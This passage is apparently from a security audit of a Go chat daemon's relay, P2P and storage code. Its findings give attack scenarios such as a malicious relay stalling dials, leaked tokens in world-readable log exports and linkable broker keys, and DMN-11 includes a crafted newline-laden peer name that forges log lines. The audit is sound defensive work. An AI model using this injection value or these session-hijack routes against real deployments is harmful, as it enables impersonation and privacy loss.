**Attack scenario.** A malicious or compromised relay (A3), or an on-path attacker that keeps the TCP connection open and drops data, stops answering new registrations. The client calls get_share_info or generate_relay_token, and the daemon ignores every later command until the relay closes the connection. Sandbox: real relay on tcp://127.0.0.1:18889, start_server relay succeeded, relay process SIGSTOPed, generate_relay_token sent, then get_status got no reply within 20 s; the reply arrived only after the relay process was killed.

**Recommendation.** Run relay registration for generate_relay_token and get_share_info in a goroutine and reply asynchronously, as start_server does. Pass a context with a timeout (for example 15 s). In relayconn, set a deadline on the adapter for the exchange and Register/Registered round trip, and use tls.Dialer.DialContext for TLS.

<details><summary>Evidence</summary>

```text
network.go:1308-1310: listener, token, ttl, sessionTTL, err := listenRelayTracked(d.ctx, d, relayAddr, relayPassword, false, staticToken)
listener.go:99-100: var d net.Dialer
	conn, err := tls.DialWithDialer(&d, "tcp", relayAddr, tlsCfg)
listener.go:146: relayBytes, err := ch.ReadBytes()
Sandbox: started: True; get_status reply within 20s: None
```

</details>

#### DMN-05

**Incognito dial sessions panic on reconnect (nil storage passed to NewDialer) and stay as zombie live sessions**

Severity: Medium · Category: correctness

Locations: `cmd/daemon/network.go:718-737`, `cmd/daemon/network.go:1104-1152`, `cmd/daemon/network.go:766`, `cmd/daemon/messaging.go:161-175`, `cmd/daemon/messaging.go:435`, `cmd/daemon/network.go:547-555` and 3 more

In dial(), sessionStore stays nil when incognito is on (network.go:718-727) and is passed to makeReconnectFn (network.go:735-737). On ErrConnClosed, receiveMessages calls reconnectSession (messaging.go:173), whose reconnectFn calls kamune.NewDialer(addr, nil, ...) (network.go:1152). NewDialer calls d.storage.Attester() on a nil *storage.Storage (dial.go:220), which panics. The panic is recovered in handleDial (network.go:547-555) as a goroutine_panic error, but finishSession is skipped. The session stays in d.sessions, status stays connected, and storageBusy() (daemon.go:293-297) stays true, so open_storage and similar commands are blocked until the host calls close_session or restarts. Only the daemon is affected; p2p sessions get a nil reconnectFn and are not affected.

**Attack scenario.** Any drop of a TCP/UDP/relay dial session while incognito is on: the remote closing its socket abruptly, a TCP RST from an on-path attacker, or a Wi-Fi change. Sandbox with two daemons (B incognito dials A, A killed): B emitted session_reconnecting attempt 1, then {"code": "goroutine_panic", "error": "goroutine panic: runtime error: invalid memory address or nil pointer dereference"}; list_sessions still returned the session and get_status returned 'connected'.

**Recommendation.** Pass the live store to makeReconnectFn regardless of incognito (incognito only needs to skip history writes), or return a nil reconnectFn when store is nil. Treat a reconnect error or panic as terminal and call finishSession and close the transport in a deferred block. In the core, have NewDialer and NewServer return an error when store is nil instead of dereferencing it.

<details><summary>Evidence</summary>

```text
network.go:718-720: var sessionStore *storage.Storage
	if s := d.store(); s != nil && !incognito { sessionStore = s
network.go:735: session.reconnectFn = d.makeReconnectFn(reconnectCtx, session, &params, sessionStore, opts)
network.go:1152: dl, err := kamune.NewDialer(addr, store, d.getVerifier(), resumeOpts...)
dial.go:220: at, err := d.storage.Attester()
Sandbox: B still has session after drop: true; B storageBusy: true
```

</details>

#### DMN-06

**Relay reconnect loop exits for good when the startup token expires, is rejected, or loses its relay link; server keeps reporting running**

Severity: Medium · Category: correctness

Locations: `cmd/daemon/network.go:158-160`, `cmd/daemon/network.go:1174-1191`, `cmd/daemon/network.go:1207-1220`, `cmd/daemon/network.go:1611-1632`, `cmd/daemon/relay.go:67-83`, `cmd/daemon/relay.go:85-93` and 1 more

relayReconnectLoop runs once per server start. It watches only the dead channel of the startup token's tokenTracker. That channel closes in four cases: the token TTL expires (startExpiryTimer calls Stop, and Stop calls closeDead when the token is not consumed), the relay link drops (Accept returns an error and calls closeDead), a handshake on the token fails (trackingConn.Close calls closeDead), or the session ends. In the first three cases no session has been stamped yet. Tokens consumed by other sessions are removed from d.relayTokens after 4 s by markRelayTokenConsumed. So relaySessionID returns an empty string, and the loop logs 'cold start required' and returns. Nothing restarts it for the lifetime of that server. Later relay sessions, including ones started from generate_relay_token or get_share_info tokens, get no ECDH reconnect listener. If the relay restarts, every listener dies, but no event is emitted. server_running stays true and status stays 'Server (relay); connected to ...'.

**Attack scenario.** Default config: token_ttl is 10 m. A user starts a relay server and shares a token from get_share_info. No one uses the startup token within 10 minutes, so the expiry timer closes tracker.dead. The loop wakes, finds no session ID, and returns. Later a peer connects through the shared token. When that peer's network drops, its daemon tries the stored ECDH tokens on the relay, but nothing listens for them, and the resume fails. In a second case, a relay operator restarts the relay, or an A3 relay drops the listener's WebSocket. The server can no longer receive connections, and the daemon tells the parent app nothing. A third case is a single user rejection in Strict or Quick mode on the startup token, which ends reconnect support the same way.

**Recommendation.** Run one reconnect supervisor per server that watches every tokenTracker, both those added later and those that expire. Only treat a dead tracker as a reconnect trigger when it carried a session. When the multiListener has no live listener left, emit an error or server_running=false event, or register a fresh random token.

<details><summary>Evidence</summary>

```text
relay.go:161-164 `timer := time.AfterFunc(t.ttl, func() { t.Stop() ...` ; relay.go:87-89 `if !t.consumed.Load() { t.closeDead() }` ; relay.go:81 `t.closeDead()` on Accept error ; network.go:1178-1183 picks only the last tracker at start ; network.go:1214-1219 `if sessionID == "" { slog.Warn("relay reconnect: no stored tokens, cold start required" ...); return }` ; network.go:1611-1626 consumed tokens are deleted from d.relayTokens after `time.Sleep(4 * time.Second)`.
```

</details>

#### DMN-07

**Removing a P2P token does not stop the listener from re-registering it on the broker**

Severity: Medium · Category: correctness

Locations: `cmd/daemon/p2p.go:90-111`, `cmd/daemon/p2p.go:217-239`, `cmd/daemon/p2plistener.go:186-188`, `cmd/daemon/p2plistener.go:206-220`, `cmd/bus/p2p.go:99-120`, `cmd/bus/p2p.go:240-263` and 2 more

With a p2pListener running, GenerateP2PToken with a peer key calls l.RegisterToken, which appends the token to l.extraTokens. RemoveP2PToken only deletes the entry from d.p2pTokens and cancels a context the listener does not watch. refreshRegistration re-sends REGISTER for l.token and every entry of l.extraTokens every 30 s, so the removed token stays live on the broker until the listener closes. There is no way to remove the listener's primary token either.

**Attack scenario.** A user removes the static token for peer X after the token leaked or after deciding not to talk to X. The listener keeps registering it, so X or anyone who computes the token can still match, receive the listener's IP:port, and open a KCP session to it.

**Recommendation.** Add p2pListener.UnregisterToken, call it from RemoveP2PToken in bus and daemon, and skip removed tokens in refreshRegistration.

_Note: Severity aligned with the bus copy of the same defect._

<details><summary>Evidence</summary>

```text
cmd/daemon/p2plistener.go:186-188: l.tokenMu.Lock(); l.extraTokens = append(l.extraTokens, token); l.tokenMu.Unlock()
cmd/daemon/p2plistener.go:206-207: allTokens := append([][]byte{l.token}, l.extraTokens...)
cmd/daemon/p2p.go:230-235: pt := d.p2pTokens[idx]; d.p2pTokens = append(...); ... pt.cancel()  // listener untouched
```

</details>

#### DMN-08

**send_message spawns one goroutine per command, so messages go out and are stored in random order**

Severity: Medium · Category: concurrency

Locations: `cmd/daemon/messaging.go:104-115`, `cmd/daemon/messaging.go:118-131`, `cmd/daemon/messaging.go:142-146`, `transport.go:158-170`

handleSendMessage wraps each send in its own goroutine (messaging.go:104). Goroutines take Transport.sendMu (transport.go:158) in scheduler order, so sequence numbers, wire order, message_sent events and AddChatEntry rows follow that order, not the order the client issued. Both peers see and store a conversation order the sender never wrote. Sender and receiver mostly agree with each other because both follow wire order. AddChatEntry runs after sendMu is released, so the sender's stored order can still drift slightly.

**Attack scenario.** No attacker needed. A client sends 30 send_message commands back to back on one session. Sandbox (self-dial): received order was ['m00', 'm08', 'm01', 'm24', 'm03', 'm09', 'm04', 'm13', ...]. A chat UI shows a conversation the sender never wrote, and local and remote history disagree.

**Recommendation.** Keep sends non-blocking for the stdin loop but serialize them per session: a per-session FIFO channel with one worker goroutine, or a per-session lock taken in dispatch order before spawning.

<details><summary>Evidence</summary>

```text
messaging.go:104-115:
	d.wg.Go(func() {
		defer func() { if msg := recover(); ... }()
		d.sendMessage(cmd, session, params.SessionID, data)
	})
messaging.go:122: metadata, err := transport.Send(kamune.Bytes(data), kamune.RouteExchangeMessages)
Sandbox recv order: ['m00', 'm08', 'm01', 'm24', 'm03', 'm09', 'm04', 'm13', 'm05', 'm12', ...]
```

</details>

#### DMN-09

**Relay reconnect token pool is never consumed or expired; listener re-registers token[0] forever, even after close**

Severity: Medium · Category: spec-drift

Locations: `cmd/daemon/network.go:1168-1275`, `cmd/daemon/network.go:1209`, `cmd/daemon/network.go:1223`, `cmd/daemon/network.go:1242-1268`, `cmd/daemon/network.go:1029-1032`, `cmd/daemon/network.go:869-876` and 15 more

RELAY.md:604-613 and 640-657 say ECDH reconnect tokens are single-use, expire after 7 days, and that the loop ends with a cold start when the pool is exhausted. The daemon's relayReconnectLoop reloads the whole pool on every wake (network.go:1223) and registers MODE_CREATE with the first token the relay accepts (network.go:1242-1268). The relay frees expired unjoined keys before CreateWith (session.go:238-253), so this is normally tokens[0]. No code marks a token used or checks its age. The pool changes only when a new handshake completes the token exchange (network.go:1029-1032). close_session clears only ResumptionTokensKey (network.go:869-876). Dead fires on any conn close (relay.go:76-78), on expiry of an unconsumed tracker (relay.go:83-86, 161-162), and when the relay purges the session (relay.go:80). The loop therefore re-registers about once per token_ttl for as long as the server runs, and appends a d.relayTokens entry each round that is never removed after expiry. The bus has the same loop (cmd/bus/relay.go:445).

**Attack scenario.** The user closes a relay session to end contact with a peer. The daemon keeps a relay registration under the same 32-byte ECDH token, renewed every token_ttl. The former peer, or anyone holding the token, can rendezvous again without a new out-of-band token, and in Quick mode a known peer is auto-accepted. The relay operator sees the same token on every re-registration and dialer join over days and links the listener across IP changes, the correlation RELAY.md says ECDH tokens avoid.

**Recommendation.** Store per-token consumed state and pop tokens on use. Store a creation time with the pool and reject entries older than 7 days. Delete RelayTokensKey on close_session and on ErrPeerDisconnected, and stop the loop on graceful close. Do not re-register on TTL expiry when no reconnect is expected. Or update RELAY.md to describe the actual reuse and lifetime.

<details><summary>Evidence</summary>

```text
network.go:1209: sessionID = relaySessionID(currentTracker, d.relayTokens)
network.go:1223: tokens, ok := loadRelayPool(st, sessionID)
network.go:1242-1244: for _, token := range tokens { listener, tokenHex, ttl, sessTTL, listenErr := listenRelayTracked(ctx, d, relayAddr, password, false, token)
relay.go:76-78: onClose: func() { t.closeDead() },
relay.go:161-162: timer := time.AfterFunc(t.ttl, func() { t.Stop() ...
grep RelayTokensKey cmd/daemon: only GetMeta (relay.go:142, network.go:1138) and SetMeta (network.go:1031, 1094)
RELAY.md:604: '**Single-use.** Each token may be consumed exactly [...]
```

</details>

#### DMN-10

**Relay address without a scheme defaults to plaintext ws; PSK and token rely only on unauthenticated HPKE**

Severity: Low · Category: security

Locations: `cmd/daemon/relay.go:186-198`, `cmd/daemon/relay.go:238-247`, `cmd/daemon/relay.go:291-300`, `pkg/relayconn/dial.go:106-121`

parseRelayAddr returns scheme 'ws' when relay_addr has no tcp://, ws://, wss:// or tls:// prefix (relay.go:196-197). The relayconn handshake runs exchange.Initiate (HPKE with no relay authentication) and then sends the PSK Auth frame and the token inside it. Over plain ws or tcp, an active on-path attacker can terminate HPKE as a fake relay and read the PSK and session token. The daemon gives no warning on the plaintext fallback, and '?insecure=true' turns off TLS verification without a warning.

**Attack scenario.** A user configures relay_addr 'relay.example.com:8080' with a password. A hostile network (A2) intercepts the WebSocket, completes HPKE with the client, captures the PSK, and joins or hijacks relay sessions with the observed token.

**Recommendation.** Require an explicit scheme or default to wss. Emit a warning log or event when the scheme is ws or tcp and a password is set, or when insecure=true is in effect.

#### DMN-11

**Full relay and P2P tokens are logged; export_logs writes them with umask-default permissions and without escaping peer names**

Severity: Low · Category: privacy

Locations: `cmd/daemon/daemon.go:227`, `cmd/daemon/daemon.go:931`, `cmd/daemon/daemon.go:939`, `cmd/daemon/network.go:338`, `cmd/daemon/network.go:1340`, `cmd/daemon/network.go:1377` and 11 more

addLogEntry sends each message to slog on stderr (daemon.go:227), to the 200-entry buffer returned by get_logs, to a log_entry event, and to export_logs. Relay tokens (network.go:338, 1340, 1467, relay.go:163) and P2P tokens (p2p.go:160, 237) are logged in full at INFO, along with session IDs, remote addresses and remote-chosen peer names (verifier.go:64, 98, 162). The bus does the same. Daemon export_logs (daemon.go:931) and bus ExportLogsToFile (app.go:1245) use os.Create, which follows symlinks, truncates existing files, and uses 0666 before umask (usually 0644). The daemon default export path is kamune-logs-&lt;timestamp&gt;.txt in the CWD. Entries are written as raw '%s [%s] %s\n' (daemon.go:939), so a peer name with newlines injects forged lines. An unconsumed relay token is a bearer capability for joining the listener's session, and a static P2P token links the two identities.

**Attack scenario.** A user exports logs to /tmp or a 0755 home directory for a bug report. Another local user (A7) reads the 0644 file, gets an unconsumed relay token and the relay address, and joins first: the intended peer's rendezvous fails, and in Auto-Accept mode the attacker is accepted. A log collector capturing stderr leaks the same lines. A remote peer named "x\n2026-01-01T00:00:00Z [INFO] [cmd/daemon] Accepted peer: Bob" forges log lines in the export.

**Recommendation.** Log only a token prefix, as relayReconnectLoop already does with tokenHex[:8] (network.go:1261). Create exports with os.OpenFile(path, O_WRONLY|O_CREATE|O_EXCL, 0600), and use a 0700 per-user directory for the default path. Escape control characters when writing the text export (for example %q).

#### DMN-12

**One process-lifetime X25519 broker key is reused for every REGISTER, so random P2P tokens are linkable**

Severity: Low · Category: privacy

Locations: `cmd/daemon/p2p.go:34-46`, `cmd/daemon/broker.go:37-43`, `cmd/daemon/broker.go:51-63`, `cmd/daemon/broker.go:98-100`, `cmd/daemon/p2plistener.go:79-81`, `cmd/daemon/p2plistener.go:180-181` and 6 more

The daemon creates one BrokerClient, and with it one X25519 key, per process (p2p.go:34-46). d.brokerClient is never cleared. Every REGISTER, including random-mode registrations, listener refreshes and the dialer's WaitMatch, carries that same 32-byte public key in plaintext (broker.go:98-100, p2plistener.go:79-81, 180-181, 214-216). bus does the same (cmd/bus/broker.go:35-58). The broker operator, or anyone on the UDP path to it, can link all of one process's rendezvous across random tokens and across source-IP changes. The broker needs a stable key only per token, for its same-peer refresh rule (cmd/relay/internal/broker/broker.go:237). RELAY.md:776-777 documents that the client holds one key for its lifetime. It does not state that random-token registrations become linkable, and RELAY.md:821 calls the field an 'ephemeral pub' that is 'not sensitive'. A leak of that one private key from memory also decrypts every captured NOTIFY sent to it during the process lifetime.

**Attack scenario.** A broker operator (A3) or a network observer (A1) records REGISTER packets. A user creates several random P2P tokens over a day, from home and then from a café. Every REGISTER carries the same 32-byte key, so the observer links all of these rendezvous to one device and records its IP history, even though each token was random.

**Recommendation.** Generate a fresh X25519 key per token registration and keep it only for that token's refresh lifetime. That satisfies the broker's same-peer refresh rule without linking separate tokens. Document the remaining per-token linkability.

#### DMN-13

**History paging decrypts the whole session on every page; SessionTimestamps count is a full page walk**

Severity: Low · Category: dos

Locations: `cmd/daemon/history.go:175`, `cmd/daemon/history.go:193`, `pkg/storage/storage.go:223`, `pkg/storage/storage.go:318`, `pkg/storage/storage.go:345`, `internal/engine/bolt_namespace.go:137` and 1 more

get_history_messages calls GetChatHistory (storage.go:223), which decrypts and sorts every chat entry before slicing offset and limit (history.go:175-199), so full paging costs O(n^2/limit) decryptions. SessionTimestamps documents itself as O(1) (storage.go:318), but KeyCount calls bucket.Stats().KeyN (bolt_namespace.go:184), which walks every page. ListSessionsByRecent runs two read transactions per session plus one for ListSessions.

**Attack scenario.** A malicious peer sends small messages at the frame rate for hours, so the session grows to hundreds of thousands of entries. Each history page request decrypts all of them, and startup history listing walks every page of every session. The daemon and bus become slow or unresponsive.

**Recommendation.** Add a storage API that seeks with a cursor to a key range and decrypts only limit entries, using key order. Keep a per-session counter in meta instead of Stats().KeyN.

#### DMN-14

**P2P dial waits for a broker match with no timeout and cannot be cancelled; empty or wrong p2p_token hangs forever and keeps storage busy**

Severity: Low · Category: dos

Locations: `cmd/daemon/network.go:538-557`, `cmd/daemon/network.go:614-653`, `cmd/daemon/broker.go:66-152`, `cmd/daemon/daemon.go:293-298`, `cmd/daemon/daemon.go:320-322`, `cmd/daemon/daemon.go:605-608` and 3 more

handleDial runs d.dial(d.ctx, ...) with the daemon lifetime context (network.go:556). The p2p branch passes that context to broker.WaitMatch (network.go:633), which loops, re-sending REGISTER every 25 s, until ctx is done or a matching PEER_MATCHED arrives (broker.go:110-151). There is no deadline and no cancel_dial command. hex.DecodeString accepts an empty p2p_token, giving an empty token; WaitMatch then sends a random-mode REGISTER, ignores the TOKEN_ASSIGNED reply, and can never match. A 64-hex static token also never matches (see the token-size finding). While the goroutine runs, dialOps > 0 keeps storageBusy() true, so open_storage and submit_passphrase are refused until the daemon exits. Each stuck dial holds a UDP socket. The bus uses a 30 s match timeout (cmd/bus/network.go:554-556) and rejects a missing token.

**Attack scenario.** The embedding app sends dial with transport p2p for an offline peer, or with an empty or mistyped p2p_token. The dial never completes or errors, re-registers on the broker every 25 s, and later storage commands fail as busy. Sandbox: WaitMatch with a 32-byte token returned only when the test's own 2 s context expired.

**Recommendation.** Wrap WaitMatch in context.WithTimeout(d.ctx, 30*time.Second) as the bus does, reject p2p_token values that are not exactly 32 hex characters, and add a cancel_dial command or tie dials to a cancellable per-command context.

#### DMN-15

**Relay dial path has no timeout, so a stalling relay hangs daemon dials forever**

Severity: Low · Category: dos

Locations: `cmd/daemon/network.go:556`, `cmd/daemon/network.go:612-614`, `cmd/daemon/relay.go:333-353`, `pkg/relayconn/dial.go:79-85`, `pkg/relayconn/dial.go:98-140`, `pkg/exchange/channel.go:114-121` and 3 more

Daemon relay dials use d.ctx (network.go:556), which is cancelled only at shutdown. pkg/relayconn relayHandshake (dial.go:98-140) sets no deadline, and exchange.Initiate blocks in ReadBytes (channel.go:118). kamune's handshake deadline (root dial.go:72) applies only after dialFunc returns (dial.go:32-37). A relay that accepts the connection and never answers blocks the dial goroutine and keeps dialOps > 0 until shutdown. For tls:// the TLS handshake runs through tls.DialWithDialer with a zero-timeout net.Dialer and no ctx (relayconn/dial.go:79-80), so it is not cancelled even at shutdown. WaitMatch hangs for a broker that answers ECHO but ignores REGISTER; a fully silent broker fails echo after 2 s (broker.go:157-160). There is no cancel-dial command.

**Attack scenario.** A malicious or overloaded relay completes the WebSocket upgrade and never answers the HPKE public key. Each dial from the embedding app leaves a goroutine and a 'Connecting...' status that never resolves, and dialOps keeps storage busy.

**Recommendation.** Wrap the relay dial and WaitMatch in context.WithTimeout (for example the 30 s handshake timeout), set a deadline on the relayconn handshake, and add a cancel_dial command.

#### DMN-16

**stdin line limit is checked after the whole line is buffered**

Severity: Low · Category: dos

Locations: `cmd/daemon/daemon.go:395`, `cmd/daemon/daemon.go:404`, `cmd/daemon/daemon.go:412`

Run reads with bufio.Reader.ReadBytes('\n') (daemon.go:404), which grows without limit until a newline arrives, and only then compares len(line) to maxScanTokenSize (1 MiB, daemon.go:412). A line without a newline consumes memory until the process is killed. The parent process is trusted, so impact is limited to a buggy or compromised parent.

**Attack scenario.** A client bug streams a large base64 payload without a newline. The daemon allocates the whole stream before emitting line_too_long, or runs out of memory.

**Recommendation.** Read with a bounded reader (bufio.Reader.ReadSlice with a 1 MiB buffer, discarding until newline on ErrBufferFull) so oversized lines are dropped while reading.

#### DMN-17

**AddChatEntry errors are ignored; messages are dropped silently when the chat bucket is missing**

Severity: Low · Category: correctness

Locations: `cmd/daemon/messaging.go:143`, `cmd/daemon/messaging.go:221`, `cmd/daemon/messaging.go:299`, `cmd/daemon/history.go:298`, `pkg/storage/storage.go:190`, `pkg/storage/storage.go:532`

All three AddChatEntry calls discard the returned error (messaging.go:143, 221, 299). AddChatEntry resolves the chat bucket through sessionChat, which uses Sub and does not create it (storage.go:190-195, 532), so it returns ErrMissingNamespace unless CreateSession ran. Two paths hit this. handleDeleteHistorySession deletes the namespace without checking whether the session is live (history.go:298). A session that began in incognito has no chat bucket, so turning incognito off mid-session does not resume saving. In both cases message_sent and message_received are emitted normally and nothing is logged. The bus logs a warning and emits history-save-failed instead. Disk-full and bolt errors are hidden the same way.

**Attack scenario.** A user deletes the history entry of a conversation that is still open, or starts a session in incognito and turns incognito off, then keeps chatting. Sandbox: after delete_history_session, send_message emitted message_sent, but get_history_sessions returned {'sessions': []}. AddChatEntry without CreateSession returned 'store chat entry: namespace not found'.

**Recommendation.** Check the AddChatEntry error and emit a warning log and a history_save_failed event. Reject delete_history_session for a session in d.sessions. Make AddChatEntry ensure the chat bucket, or call CreateSession for live sessions when incognito is turned off.

#### DMN-18

**generate_p2p_token without a p2p listener registers from a throwaway UDP socket, so matches point to a dead port**

Severity: Low · Category: correctness

Locations: `cmd/daemon/p2p.go:68-112`, `cmd/daemon/p2p.go:114-162`, `cmd/daemon/p2p.go:299-340`, `cmd/daemon/network.go:940-967`, `pkg/relayconn/broker/client.go:120-158`, `cmd/relay/internal/broker/broker.go:237-252`

generate_p2p_token registers from a throwaway UDP socket whenever it does not take the listener path at p2p.go:90. That covers a non-p2p server and a random token with no existing non-static entry for that broker. The broker records the closed socket as the peer address. runP2PRefresh repeats this every 30 s. Separately, p2p.go:90 does not compare brokerAddr with l.brokerAddr. A static token requested for another broker is registered on the listener's broker, while the record shows the requested address.

**Attack scenario.** No attacker needed. A user with a TCP or relay server, or a different broker_addr, calls generate_p2p_token and shares the token. The daemon lists it as active, but every dial matches at the broker and then fails in hole punching or the handshake.

**Recommendation.** Allow generate_p2p_token only when a p2pListener is running for that broker address, and register all tokens through the listener's punch socket (RegisterToken). Otherwise return an error.

#### DMN-19

**get_share_info reports the requested bind address (for example 0.0.0.0:0), not the bound one**

Severity: Low · Category: correctness

Locations: `cmd/daemon/network.go:56`, `cmd/daemon/network.go:195`, `cmd/daemon/network.go:226-227`, `cmd/daemon/network.go:1398-1399`, `cmd/daemon/network.go:1485-1487`, `cmd/bus/network.go:1069-1123`

handleStartServer stores d.serverAddr = params.Addr (network.go:56) before the listener binds. startServer updates only its local params.Addr to pl.Addr().String() (network.go:227). handleGetShareInfo builds 'direct-p2p://'+d.serverAddr, so the documented example addr '0.0.0.0:0' produces 'direct-p2p://0.0.0.0:0'. TCP and UDP with port 0 also report port 0. The bus GetShareInfo has no p2p case, so its 'p2p' transport fails with 'unknown transport'.

**Attack scenario.** No attacker needed. An app starts a direct-p2p server with addr 0.0.0.0:0 as DAEMON.md shows and shares the card. The peer's dial to direct-p2p://0.0.0.0:0 fails, and users fall back to copying addresses by hand.

**Recommendation.** Store the bound listener address in d.serverAddr after the listener is created (or read it from d.p2pListener), and resolve the public address for direct-p2p. Add p2p and direct-p2p cases to the bus GetShareInfo.

#### DMN-20

**HolePunch cancels its NAT-kick burst on return; 0 or 1 kick packets are sent and the timeout is ignored**

Severity: Low · Category: correctness

Locations: `cmd/daemon/broker.go:262-306`, `cmd/bus/broker.go:342-392`, `cmd/bus/broker.go:27-33`

HolePunch (daemon broker.go:278-306, bus broker.go:372-392) starts go sendNATKick(punchCtx, ...) under defer punchCancel() and then returns as soon as kcp.NewConn4 succeeds. The deferred cancel runs on return. sendNATKick checks ctx.Err() before each write and sleeps 100 ms between writes, so it sends 0 or 1 of the 5 intended packets. The daemon's context.WithTimeout bounds only the entry check at broker.go:287-289, where ErrHolePunchFailed is the only use. Nothing waits for a reply from the peer. Bus ignores the timeout parameter (named _), although broker.go:27-33 documents that HolePunch waits for the peer's first KCP packet. The handshake's own KCP packets still leave the punch socket toward the peer, which limits the practical effect.

**Attack scenario.** No attacker. A dialer behind a NAT that needs several outbound packets before installing a mapping does not get them, which lowers hole-punch success. Sandbox TestRT_HolePunchKickCancelled over three runs: 'NAT kick packets received: 0', '1', '0' (intended 5).

**Recommendation.** Run the kick burst synchronously before returning (as directP2PDial does) or derive punchCtx from a context that outlives HolePunch. Either wait for a first packet from the peer and return ErrHolePunchFailed on timeout, or remove the unused timeout parameter and error.

#### DMN-21

**P2P listener never processes PEER_MATCHED; it never punches toward the dialer and the NOTIFY becomes a phantom KCP session**

Severity: Low · Category: correctness

Locations: `cmd/daemon/p2plistener.go:98-121`, `cmd/daemon/p2plistener.go:153-164`, `cmd/bus/p2plistener.go:25-28`, `cmd/bus/p2plistener.go:132-158`, `cmd/relay/internal/broker/broker.go:292-295`, `cmd/daemon/broker.go:278-305`

newP2PListener hands the punch socket to kcp.ServeConn, so the listener never decodes NOTIFY(PEER_MATCHED) or kicks toward the dialer. Only the dialer punches, so connections fail behind endpoint-dependent-filtering NATs. kcp-go accepts the NOTIFY (len >= 24, conv = LE('KBRK')) as a new session from the broker address. kamune then waits 30 s on HPKE Accept. Later NOTIFYs feed the same session, so at most one phantom exists at a time. Bus is identical, and its comment at p2plistener.go:25-28 wrongly says NOTIFYs are dropped.

**Attack scenario.** No attacker needed. A user behind a common home NAT starts a p2p server. Dialers match at the broker but never connect, and every match produces an orphan handshake goroutine on the server.

**Recommendation.** Demultiplex the punch socket with a wrapping PacketConn: handle broker packets (magic 'KBRK'), send a NAT kick burst to the dialer address on PEER_MATCHED, and pass only other packets to KCP. Accept KCP only from addresses learned through PEER_MATCHED.

#### DMN-22

**P2P token refresh loop: expiry timer fires before the first refresh, so tokens vanish after 30 s**

Severity: Low · Category: correctness

Locations: `cmd/daemon/p2p.go:143-161`, `cmd/daemon/p2p.go:253-297`, `cmd/bus/p2p.go:153-175`, `cmd/bus/p2p.go:285-330`

GenerateP2PToken sets ExpiresAt = now + 30 s and starts runP2PRefresh. The loop creates a ticker of p2pTokenRefreshInterval (30 s) and an AfterFunc at ExpiresAt, which fires a few microseconds before the first tick. The AfterFunc calls removeP2PTokenByValue, which cancels pt.ctx, so the loop exits before or right after the first refresh. Both intervals use the same constant, so there is no margin. The bus has the same code.

**Attack scenario.** No attacker. A user generates a P2P token through the non-listener path. After about 30 s the token disappears from the list and its refresh stops, although the broker is reachable. Sandbox TestRT_P2PRefreshExpiryRace with a working fake broker: 'tokens after first interval: 0'.

**Recommendation.** Refresh before expiry: use a ticker shorter than the TTL (for example TTL/2), or extend ExpiresAt on each successful refresh, and only expire after a failed refresh.

#### DMN-23

**Re-opening an already open storage path (open_storage or submit_passphrase) always fails after the 5 s bolt lock timeout**

Severity: Low · Category: correctness

Locations: `cmd/daemon/daemon.go:300-316`, `cmd/daemon/daemon.go:348`, `cmd/daemon/daemon.go:611`, `internal/engine/bolt_store.go:49`, `docs/DAEMON.md:133`, `docs/DAEMON.md:1864`

openStorage and handleSubmitPassphrase open the new Storage first and close the old one only afterwards in installStore (daemon.go:300-316). bbolt holds an exclusive flock per open handle, so a second open of the same path in the same process waits bolt.Options.Timeout (5 s, bolt_store.go:49) and fails. submit_passphrase therefore works only after a failed open_storage, and open_storage on the current path always fails while blocking the command loop for 5 s. DAEMON.md:133 describes submit_passphrase as re-opening the previously opened path, and DAEMON.md:1864-1865 says the previous instance is closed first.

**Attack scenario.** A client calls open_storage twice for the same path (for example after reconnecting its UI) or calls submit_passphrase to re-unlock. Sandbox: the second open_storage returned {'code': 'storage_open_failed', 'error': 'failed to open storage: opening kamune db: open db: timeout'} after 5.0 s. A separate in-process repro with a 1 s timeout failed with 'open db: timeout after 959ms'.

**Recommendation.** When the requested path equals d.dbPath and storage is idle (storageBusy already guarantees no users), close the current store before opening and reopen it with the old passphrase if the new open fails. Or return an explicit already_open response. Update DAEMON.md to match.

#### DMN-24

**set_log_level filters only stderr; the log buffer, log_entry events and export_logs always include DEBUG entries**

Severity: Low · Category: correctness

Locations: `cmd/daemon/daemon.go:215-243`, `cmd/daemon/daemon.go:962-985`, `cmd/daemon/daemon.go:914-949`, `docs/DAEMON.md:1340-1343`

addLogEntry passes the level to slog, which filters stderr through daemonLogLevel. It then appends every entry to d.logEntries and emits a log_entry event whatever the configured level. So with set_log_level ERROR, DEBUG and INFO entries are still streamed to the parent, returned by get_logs, and written by export_logs. These include per-message 'Received message from &lt;session&gt;' and 'Sent message to &lt;session&gt;' lines, keepalive failures, and INFO token lines. A DEBUG flood also pushes ERROR entries out of the 200-entry buffer.

**Attack scenario.** An operator sets the level to ERROR to cut log volume and metadata. An exported log file or a log_entry subscriber still receives a timestamped line for every message sent and received, which records the conversation timing.

**Recommendation.** In addLogEntry, compare the entry level with daemonLogLevel before buffering and emitting, or document that the level applies to stderr only.

#### DMN-25

**set_verification_mode restarts the server and closes every live session, including outgoing dials**

Severity: Low · Category: correctness

Locations: `cmd/daemon/verifier.go:245-261`, `cmd/daemon/network.go:362-406`, `cmd/daemon/network.go:411-436`, `docs/DAEMON.md:837`

handleSetVerificationMode calls handleRestartServer synchronously whenever a server is running (verifier.go:259-261). stopServer takes every entry of d.sessions, incoming and dialed, and closes them (network.go:377-395), waiting up to 5 s per session on the command loop. Dialed sessions do not depend on the server verifier. Transport.Close sends RouteCloseTransport and invalidates resumption tokens, so the dropped sessions cannot resume. For relay servers the restart also discards all relay tokens and registers a new random one, so shared tokens stop working. DAEMON.md:837-838 says only that the server is restarted to apply the mode to incoming connections.

**Attack scenario.** A user switches from Quick to Strict during an active chat. Sandbox: one live session before; list_sessions returned 0 sessions after set_verification_mode.

**Recommendation.** On restart, close only listener-side resources or only sessions with IsServer=true. Or read the verification mode dynamically inside one verifier closure so no restart is needed. Document the behaviour if sessions must drop.

#### DMN-26

**Settings from a previously opened DB (verification mode, incognito, log level) carry over to a newly opened DB**

Severity: Low · Category: correctness

Locations: `cmd/daemon/history.go:53-82`, `cmd/daemon/daemon.go:577`, `cmd/daemon/daemon.go:630`, `cmd/daemon/daemon.go:300-317`

loadIdentityAndHistory overwrites verifMode, incognito, fingerprintFmt and logLevel only when the new store has a value (history.go:53-82) and never resets them to defaults. After open_storage on DB A (verification_mode=2 auto-accept) and then on a fresh DB B, the daemon runs B in auto-accept and get_verification_mode reports 2.

**Attack scenario.** A test profile with Auto-Accept is opened first, then the real profile with no stored mode in the same daemon process. Incoming peers on the real profile are accepted and stored without a prompt.

**Recommendation.** Reset these fields to NewDaemon defaults at the start of loadIdentityAndHistory, then apply the stored values.

#### DMN-27

